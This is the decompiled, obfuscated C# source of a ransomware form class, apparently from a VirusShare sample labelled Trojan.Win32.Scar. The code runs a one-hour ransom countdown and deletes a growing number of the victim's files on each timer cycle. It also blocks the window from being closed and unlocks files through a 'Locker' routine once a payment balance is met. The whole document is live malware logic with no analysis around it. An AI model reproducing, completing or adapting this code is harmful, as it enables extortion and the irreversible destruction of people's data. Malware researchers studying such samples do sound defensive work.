// Decompiled with JetBrains decompiler
// Type: Main.FormGame
// Assembly: BitGenerator, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=70e4c26ef2031892
// MVID: D3922F89-E00A-4D10-8BC9-9309D5539F14
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.Win32.Scar.nxii-31823040d8ccb20eab0b8653d01af370a6537017e69ead69f6f7b73d6ef7ac14.exe

using \u0003;
using \u0014;
using Main.Tools;
using SmartAssembly.Delegates;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Main
{
  public sealed class FormGame : Form
  {
    private static int \u0001;
    private static int \u0002;
    private static int \u0003;
    internal IContainer \u0001;
    internal Label \u0001;
    internal Timer \u0001;
    internal Label \u0002;
    internal TextBox \u0001;
    internal Button \u0001;
    internal Button \u0002;
    internal Timer \u0002;
    internal Label \u0003;
    internal Label \u0004;
    [NonSerialized]
    internal static GetString \u0091;

    public FormGame() => \u0006.\u0001(this);

    internal void \u0001([In] object obj0, [In] EventArgs obj1)
    {
label_0:
      \u0012.\u001F\u0002((object) this, false);
      \u0012 obj = \u0012.\u007F\u0002;
      if (true)
        goto label_9;
label_1:
      \u0017.\u0091\u0002((object) this, FormStartPosition.CenterScreen);
      \u0006.\u0001((Form) this);
      \u0018.\u007E\u0092\u0002((object) this.\u0001, 50);
      \u0012.\u007E\u0080\u0002((object) this.\u0001, true);
      \u0019.\u007E\u0098\u0002((object) this.\u0001, FormGame.\u0091(2018));
      \u0019.\u007E\u0098\u0002((object) this.\u0002, \u0001.\u000F);
      do
      {
        \u0012.\u007E\u0081\u0002((object) this.\u0002, false);
        \u0012.\u007E\u0082\u0002((object) this.\u0001, true);
        \u0019.\u007E\u0098\u0002((object) this.\u0001, FormGame.\u0001());
        \u0012.\u007E\u0081\u0002((object) this.\u0001, false);
        if (true)
          \u0012.\u007E\u0081\u0002((object) this.\u0001, false);
        else
          goto label_0;
      }
      while (false);
      \u0012.\u007E\u0081\u0002((object) this.\u0002, false);
      \u0012.\u007E\u0081\u0002((object) this.\u0003, false);
      \u0012.\u007E\u0080\u0002((object) this.\u0002, false);
      \u0012.\u007E\u0081\u0002((object) this.\u0004, false);
      int num;
      for (int index = \u0006.\u0001() ? 1 : 0; index != 0; index = num)
      {
        num = 1000;
        if (num != 0)
        {
          FormGame.\u0001(num);
          break;
        }
      }
      return;
label_9:
      obj((object) this, false);
      goto label_1;
    }

    private static void \u0001([In] int obj0)
    {
      try
      {
        int num = 0;
        do
        {
          if (true)
            goto label_12;
label_11:
          continue;
label_12:
          HashSet<string>.Enumerator enumerator = \u0006.\u0001().GetEnumerator();
          try
          {
            while (true)
            {
              if (true)
                goto label_7;
label_5:
              string current;
              \u001A.\u009F\u0002(\u0006.\u009B(current, FormGame.\u0091(2009)));
              ++num;
              continue;
label_7:
              if (enumerator.MoveNext())
              {
                current = enumerator.Current;
                if (num != obj0)
                  goto label_5;
                else
                  break;
              }
              else
                goto label_11;
            }
            break;
          }
          finally
          {
            do
            {
              enumerator.Dispose();
            }
            while (false);
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
      }
    }

    private static string \u0001()
    {
      string str1 = \u0006.\u009A(\u0001.\u0008, FormGame.\u0091(2024));
      if (!\u0007.\u009D(str1))
        goto label_10;
label_1:
      return \u001B.\u0001\u0003(str1);
label_10:
      HashSet<string> source = new HashSet<string>();
      string str2;
      if (true)
      {
        \u001C obj = \u001C.\u007E\u0008\u0003;
        string str3 = \u0006.\u0001();
        string[] strArray = new string[1]{ \u0004.\u0097() };
        foreach (string str4 in ((IEnumerable<string>) obj((object) str3, strArray, StringSplitOptions.RemoveEmptyEntries)).ToList<string>())
          source.Add(\u0001.\u007E\u0004((object) str4));
        str2 = source.OrderBy<string, Guid>((Func<string, Guid>) delegate
        {
          return \u0087.\u0087\u0003();
        }).FirstOrDefault<string>();
      }
      \u001D.\u000E\u0003(str1, str2);
      if (true)
        return str2;
      goto label_1;
    }

    [SpecialName]
    CreateParams Form.\u0001()
    {
      CreateParams createParams = \u001E.\u000F\u0003((object) this);
      createParams.ClassStyle |= 512;
      return createParams;
    }

    internal void \u0001([In] object obj0, [In] FormClosingEventArgs obj1)
    {
      do
      {
        if (true)
          \u0012.\u007E\u0083\u0002((object) obj1, true);
        int num = (int) \u007F.\u001A\u0003((IWin32Window) this, FormGame.\u0091(2041));
      }
      while (false);
    }

    internal void \u0002([In] object obj0, [In] EventArgs obj1)
    {
      string str = \u0001.\u000E;
      \u0019.\u007E\u0098\u0002((object) this.\u0001, \u0006.\u009B(\u0080.\u007E\u001B\u0003((object) str, 0, FormGame.\u0003), FormGame.\u0091(2130)));
      int num1 = FormGame.\u0003;
      int num2 = 1;
      if (num2 != 0)
      {
        FormGame.\u0003 = num1 + num2;
        int num3 = FormGame.\u0003;
        num2 = \u001F.\u007E\u0011\u0003((object) str) + 1;
        num1 = num3;
      }
      if (num1 != num2)
        return;
      \u0012.\u007E\u0080\u0002((object) this.\u0001, false);
      \u0012.\u007E\u0081\u0002((object) this.\u0002, true);
      \u0012.\u007E\u0081\u0002((object) this.\u0001, true);
      \u0012.\u007E\u0081\u0002((object) this.\u0001, true);
      do
      {
        \u0012.\u007E\u0081\u0002((object) this.\u0002, true);
        \u0012.\u007E\u0081\u0002((object) this.\u0003, true);
      }
      while (false);
      \u0012.\u007E\u0080\u0002((object) this.\u0002, true);
      \u0012.\u007E\u0081\u0002((object) this.\u0004, true);
      FormGame.\u0001 = 3600;
    }

    internal unsafe void \u0003([In] object obj0, [In] EventArgs obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      try
      {
        *(double*) voidPtr = \u0006.\u0001();
        *(int*) ((IntPtr) voidPtr + 8) = (int) (\u0006.\u0001(FormGame.\u0001()) * *(double*) voidPtr);
        int num1 = *(int*) ((IntPtr) voidPtr + 8);
        int num2 = \u0001.\u0002;
        if (true)
        {
          if (num1 > num2)
          {
            \u0011.\u007E\u0008\u0002((object) this.\u0002);
            if (true)
            {
              \u0012.\u007E\u0084\u0002((object) this.\u0001, false);
              \u0082.\u007E\u0081\u0003((object) this.\u0001, \u0081.\u001C\u0003());
            }
            \u0019.\u007E\u0098\u0002((object) this.\u0001, FormGame.\u0091(2135));
            int num3 = (int) \u0083.\u0083\u0003((IWin32Window) this, FormGame.\u0091(2188), FormGame.\u0091(2354));
            Locker.\u0001(FormGame.\u0091(2009));
            \u0001.\u0001();
            return;
          }
          int num4 = *(int*) ((IntPtr) voidPtr + 8);
          num2 = 0;
          num1 = num4;
        }
        if (num1 > num2)
        {
          \u0082.\u007E\u0081\u0003((object) this.\u0001, \u0081.\u001D\u0003());
          \u0019.\u007E\u0098\u0002((object) this.\u0001, FormGame.\u0091(2367));
        }
        else
        {
          \u0082.\u007E\u0081\u0003((object) this.\u0001, \u0081.\u001D\u0003());
          \u0019.\u007E\u0098\u0002((object) this.\u0001, FormGame.\u0091(2420));
        }
      }
      catch
      {
        \u0019.\u007E\u0098\u0002((object) this.\u0001, FormGame.\u0091(2477));
        \u0082.\u007E\u0081\u0003((object) this.\u0001, \u0081.\u001D\u0003());
      }
    }

    internal void \u0004([In] object obj0, [In] EventArgs obj1) => \u0010.\u007E\u0006\u0002((object) new \u0002(), (IWin32Window) this);

    internal unsafe void \u0005([In] object obj0, [In] EventArgs obj1)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(12);
        int num1 = FormGame.\u0001;
        if (true)
        {
          int num2;
          for (int index = 0; num1 > index; num1 = num2)
          {
            num2 = FormGame.\u0001;
            int num3;
            int num4;
            while (true)
            {
              num3 = 1;
              if (num3 != 0)
              {
                num4 = num2 - num3;
                if (false)
                  num2 = num4;
                else
                  goto label_7;
              }
              else
                break;
            }
            index = num3;
            continue;
label_7:
            FormGame.\u0001 = num4;
            *(int*) voidPtr = FormGame.\u0001 / 60;
            *(int*) ((IntPtr) voidPtr + 4) = FormGame.\u0001 % 60;
            \u0019.\u007E\u0098\u0002((object) this.\u0003, \u000F.\u0005\u0002((object) *(int*) voidPtr, (object) FormGame.\u0091(2538), (object) *(int*) ((IntPtr) voidPtr + 4)));
            return;
          }
          num1 = 3600;
        }
        FormGame.\u0001 = num1;
        if (false)
          return;
        *(int*) ((IntPtr) voidPtr + 8) = (int) \u0084.\u0084\u0003(1.1, (double) FormGame.\u0002);
        \u0019.\u007E\u0098\u0002((object) this.\u0004, \u0086.\u0086\u0003((object) *(int*) ((IntPtr) voidPtr + 8), (object) FormGame.\u0091(2543)));
        ++FormGame.\u0002;
      }
      else
        goto label_14;
label_13:
      FormGame.\u0001(*(int*) ((IntPtr) voidPtr + 8));
label_14:
      if (false)
        goto label_13;
    }

    void Form.\u0001([In] bool obj0)
    {
      while (true)
      {
        if (obj0)
        {
          while (this.\u0001 != null)
          {
            if (true)
            {
              \u0011.\u007E\u0007\u0002((object) this.\u0001);
              break;
            }
          }
        }
        if (true)
        {
          \u0012.\u001E\u0002((object) this, obj0);
          break;
        }
      }
    }

    static FormGame() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (FormGame));
  }
}
